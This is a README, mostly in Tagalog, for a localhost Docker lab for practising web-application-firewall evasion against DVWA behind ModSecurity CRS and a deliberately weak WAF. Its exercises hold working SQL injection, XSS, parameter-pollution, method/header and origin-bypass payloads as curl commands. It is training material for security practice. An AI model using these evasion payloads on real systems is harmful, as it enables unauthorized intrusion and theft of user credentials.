# WAF Bypass Practice Lab

Isolated, local-only lab para sa pag-practice ng **WAF evasion** techniques mula sa
`offensive-waf-bypass` skill at `waf-evasion-playbook.md`.

Lahat ng service ay nakabind sa `127.0.0.1` — hindi exposed sa LAN.

---

## Architecture

```
                         ┌──────────────────────────────────────────────┐
   DVWA direct  :8080 ──▶│ DVWA (deliberately vulnerable app)           │
                         │   admin / password, security = low           │
                         └──────────────────────────────────────────────┘
                                        ▲
   CRS WAF      :8081 ──▶ nginx + ModSecurity + OWASP CRS 4.30 ─────────┘
                         (real-world, strong: libinjection + anomaly score)

   Weak WAF     :8084 ──▶ naive Python literal matcher ─────────────────┘
                         (intentionally bypassable — for learning)

   Echo direct  :8082 ──▶ echo service (headers/method/body reflection)
   CRS WAF echo :8083 ──▶ echo behind CRS
   Weak echo    :8085 ──▶ echo behind weak WAF
```

| Port | Service | Purpose |
|---|---|---|
| 8080 | DVWA direct | Baseline / "origin exposed" (T9) |
| 8081 | DVWA behind **CRS** | Real WAF: mabagsik, may rule IDs |
| 8082 | Echo direct | Baseline para sa headers/methods |
| 8083 | Echo behind **CRS** | Header/method/HPP behavior ng CRS |
| 8084 | DVWA behind **WeakWAF** | Dito may successful payload bypass |
| 8085 | Echo behind **WeakWAF** | Method/header/HPP bypass demos |

**DVWA creds:** `admin` / `password` (security level: `low`)

---

## Quick start

```bash
cd ~/labs/waf-lab
cp .env.example .env      # optional: edit ports/binding
./deploy.sh               # checks prereqs + ports, starts, runs tests
```

Manual equivalent:

```bash
docker compose up -d
./check.sh                # setup DVWA + buong test matrix
```

---

## Deploy sa Ubuntu lab PC (kasama ng crAPI)

### Requirements

```bash
docker --version
docker compose version
```

Kung kulang ang Compose v2 sa Ubuntu:

```bash
# Option A — Ubuntu package
sudo apt update && sudo apt install -y docker-compose-v2

# Option B — Docker's official plugin
sudo apt install -y docker-compose-plugin
```

At siguraduhing may daemon access ang user:

```bash
sudo usermod -aG docker "$USER"
newgrp docker          # o mag-logout/login
```

### Transfer

Mula sa machine na ito (WSL), i-copy ang buong folder:

```bash
rsync -av --exclude '.dvwa-cookies.txt' --exclude 'evidence/' \
  ~/labs/waf-lab/ \
  user@HOST:/opt/waf-lab/
```

O gamitin ang portable tarball:

```bash
# dito gawin
tar -czf waf-lab-portable.tar.gz \
  --exclude='waf-lab/.dvwa-cookies.txt' --exclude='waf-lab/evidence' \
  -C ~/labs waf-lab

# sa Ubuntu PC
tar -xzf waf-lab-portable.tar.gz -C ~/labs/
```

Walang data na kailangang i-migrate — nasa loob ng container ang DVWA DB, at
`./check.sh` ang gagawa ng setup.

### Coexistence with crAPI

Karaniwang exposed ports ng crAPI stack:

| crAPI service | Typical port |
|---|---|
| crapi-web | 8888 |
| identity | 8080 (possible conflict) |
| mailhog | 8025 |
| postgres | 5432 |
| mongodb | 27017 |
| jaeger | 16686 |
| prometheus | 9090 |
| grafana | 3000 |

I-check muna:

```bash
docker ps --format 'table {{.Names}}\t{{.Ports}}'
ss -ltn
```

Kung taken ang 8080–8085 (madalas ang 8080), gumawa ng `.env` na naka-shift
sa 9080–9085:

```bash
cd ~/labs/waf-lab
cp .env.example .env
sed -i -e 's/^DVWA_PORT=8080/DVWA_PORT=9080/' \
       -e 's/^WAF_PORT=8081/WAF_PORT=9081/' \
       -e 's/^ECHO_PORT=8082/ECHO_PORT=9082/' \
       -e 's/^WAF_ECHO_PORT=8083/WAF_ECHO_PORT=9083/' \
       -e 's/^WEAK_PORT=8084/WEAK_PORT=9084/' \
       -e 's/^WEAK_ECHO_PORT=8085/WEAK_ECHO_PORT=9085/' \
       .env
./deploy.sh
```

Awtomatikong ginagamit ng compose **at** ng `check.sh` ang `.env`, kaya
magkatugma ang test URLs at port bindings.

Hindi magkakabangga ang Docker networks: `waf-lab_default` (project name
`waf-lab`) vs ang crAPI compose project. Magkaiba rin ang container names
(`waflab-*`).

### Access mula sa ibang machine (optional)

Default ay `LAB_BIND=127.0.0.1` — localhost lang. Kung kailangan mong
i-access mula sa isa pang lab VM:

```bash
# .env
LAB_BIND=0.0.0.0
```

Tapos sa client machine, gamitin ang LAN IP ng Ubuntu PC:

```bash
curl http://192.168.1.50:9081/
```

> ⚠️ Deliberately vulnerable ang DVWA at WeakWAF. Huwag i-expose sa
> production/LAN na may ibang tao. Kung kailangan, i-restrict sa firewall
> (e.g. `ufw allow from 192.168.1.0/24 to any port 9080:9085`).

### Optional hostname

Kung gusto mong `http://waflab.lab:9081` sa halip na IP, idagdag sa
`/etc/hosts` ng **client machine**:

```
192.168.1.50  waflab.lab
```

### Verify after deploy

```bash
cd ~/labs/waf-lab
./check.sh --tests
docker compose logs --tail=30 waf | grep -E '942100|949110|403'
```

Expected: `200` sa benign, `403` sa malicious (CRS), at successful bypasses
sa `:9084` (WeakWAF).

Kung naka-setup na ang DVWA at gusto mo lang ulit ang tests:

```bash
./check.sh --tests
```

Tingnan ang WAF decisions (may **rule IDs** — napaka-useful para sa learning):

```bash
docker compose logs -f waf        # CRS WAF
docker compose logs -f weak-waf   # WeakWAF
```

I-reset ang lahat (pati DB):

```bash
docker compose down -v
docker compose up -d
./check.sh
```

---

## Exercises

### Exercise 1 — Fingerprint (T0)

```bash
curl -si http://127.0.0.1:8081/ | head -20
curl -si http://127.0.0.1:8080/ | head -20
```

**Tanong:** Anong headers ang naghuhudyat ng WAF? Ano ang pagkakaiba ng direct vs WAF?

---

### Exercise 2 — Makita ang block vs pass (T1/T2)

```bash
JAR=.dvwa-cookies.txt

# benign
curl -s -b $JAR -o /dev/null -w '%{http_code}\n' \
  'http://127.0.0.1:8081/vulnerabilities/sqli/?id=1&Submit=Submit'

# malicious
curl -s -b $JAR -o /dev/null -w '%{http_code}\n' \
  -G --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8081/vulnerabilities/sqli/'
```

Expected: `200` tapos `403`.

Sa `docker compose logs waf`, hanapin ang:
- `ruleId":"942100"` → SQLi via libinjection
- `ruleId":"949110"` → inbound anomaly score exceeded

**Lesson:** ang block ay **anomaly score**, hindi isang rule lang. Kaya kapag
napataas ang score → block.

---

### Exercise 3 — CRS: lahat ng classic SQLi variant ay nahuhuli

Subukan lahat ng ito sa **8081**; lahat dapat `403`:

```bash
for p in \
  "1' OR '1'='1" \
  "1' OR 1=1-- -" \
  "1' UNION SELECT user,password FROM users-- -" \
  "1' UNION/**/SELECT/**/user,password/**/FROM/**/users-- -" \
  "1' OR 1 LIKE 1-- -" \
  "1' || '1'='1"
do
  code=$(curl -s -b .dvwa-cookies.txt -o /dev/null -w '%{http_code}' \
    -G --data-urlencode "id=$p" --data-urlencode 'Submit=Submit' \
    'http://127.0.0.1:8081/vulnerabilities/sqli/')
  printf '%s  %s\n' "$code" "$p"
done
```

**Lesson:** ang libinjection ay **syntax-aware** — hindi ito lumalaban sa case
o comments. Kaya kailangan ng ibang pinto (identity, protocol, origin).

---

### Exercise 4 — WeakWAF: tunay na bypass (T2)

Lahat sa **8084**:

```bash
# 1) literal — blocked
curl -s -b .dvwa-cookies.txt -o /dev/null -w '%{http_code}\n' \
  -G --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/'

# 2) case variation — BYPASS
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1' oR 1=1-- -" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -E 'First name|Surname'

# 3) comment injection — BYPASS
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1'/**/OR/**/'1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -E 'First name|Surname'

# 4) UNION leak — BYPASS
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1' UnIoN SeLeCt user,password FROM users-- -" \
  --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -E 'First name|Surname'
```

Expected: lumalabas ang maraming users, at sa UNION ay **password hashes**.

**Lesson:** `UNION SELECT` vs `UnIoN SeLeCt` — pareho sa SQL engine, hindi sa
naive signature.

---

### Exercise 5 — HPP (T3)

```bash
# WeakWAF checks only the FIRST value; PHP uses the LAST value.
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode 'id=1' \
  --data-urlencode "id=1' OR '1'='1" \
  --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8084/vulnerabilities/sqli/' | grep -c 'First name:'
```

Expected: maraming rows → nag-execute ang injection kahit ang unang `id` lang
ang chineck ng WAF.

Ihambing sa **CRS** (`:8081`) — dapat `403` pa rin, dahil ini-inspect niya ang
lahat ng values.

---

### Exercise 6 — XSS bypass (T2/T4)

```bash
# WeakWAF: literal <script> blocked
curl -s -b .dvwa-cookies.txt -G --data-urlencode 'name=<script>alert(1)</script>' \
  -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:8084/vulnerabilities/xss_r/'

# Case bypass
curl -s -b .dvwa-cookies.txt -G --data-urlencode 'name=<ScRiPt>alert(1)</ScRiPt>' \
  'http://127.0.0.1:8084/vulnerabilities/xss_r/' | grep -o 'Hello.*'

# Alternative tag
curl -s -b .dvwa-cookies.txt -G --data-urlencode 'name=<img src=x onerror=alert(1)>' \
  'http://127.0.0.1:8084/vulnerabilities/xss_r/' | grep -o 'Hello.*'
```

Bukasan ang response sa browser kung gusto mong makita ang execution (local lab lang).

**Lesson:** `alert(1)` ay hindi kailangan literal na `alert` sa payload.

---

### Exercise 7 — Method / header (T5/T7)

```bash
# Direct echo
curl -s http://127.0.0.1:8082/method

# WeakWAF inspects only GET/POST → PUT passes
curl -s -X PUT http://127.0.0.1:8085/method

# CRS blocks X-HTTP-Method-Override
curl -s -o /dev/null -w '%{http_code}\n' -X POST \
  -H 'X-HTTP-Method-Override: PUT' http://127.0.0.1:8083/method

# Header passthrough
curl -s -H 'X-Forwarded-For: 127.0.0.1' http://127.0.0.1:8085/headers
```

**Lesson:** iba-iba ang sakop ng inspection ng bawat WAF. Alamin kung **saan**
tumitingin ang WAF bago mag-craft ng payload.

---

### Exercise 8 — Origin bypass (T9)

Sa lab, ang `:8080` ay kumakatawan sa "exposed origin".

```bash
# Through WAF (blocked)
curl -s -o /dev/null -w 'WAF: %{http_code}\n' -b .dvwa-cookies.txt \
  -G --data-urlencode "id=1' OR '1'='1" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8081/vulnerabilities/sqli/'

# Direct origin (no WAF in path)
curl -s -b .dvwa-cookies.txt -G \
  --data-urlencode "id=1' OR 1=1-- -" --data-urlencode 'Submit=Submit' \
  'http://127.0.0.1:8080/vulnerabilities/sqli/' | grep -E 'First name|Surname'
```

**Lesson:** ang pinaka-malakas na "bypass" ay hindi bypass — pag-iwas sa WAF
nang tuluyan (origin IP). Sa totoong engagement, scope pa rin ang masusunod.

---

## Verification rule

> `200 OK` ay **hindi** sapat. Kailangan may app-level effect.

Sa lab:

- SQLi → maraming `First name:` rows, o password hashes
- XSS → lumabas ang payload sa `<pre>Hello ...</pre>`
- Header → nakita ang header sa echo response

At 3/3 reproducible. Nasa `check.sh` ang automated matrix.

---

## Files

| File | Purpose |
|---|---|
| `docker-compose.yml` | 6 services (DVWA, echo, CRS WAF ×2, weak WAF ×2) |
| `weak_waf.py` | Ang naive WAF (may 6 intentional weaknesses) |
| `check.sh` | Setup + test matrix + log inspection |
| `.dvwa-cookies.txt` | Session cookies (auto-generated) |
| `evidence/` | Saved HTML responses |

---

## Safety

- Localhost-only (`127.0.0.1` binds).
- Deliberately vulnerable apps — **huwag** i-expose sa network.
- Ang lab ay para sa **authorized practice** lang.
- `docker compose down -v` para tuluyang linisin.

---

*Ginawa 2026-11-12. Batay sa `offensive-waf-bypass` skill at `waf-evasion-playbook.md`.*
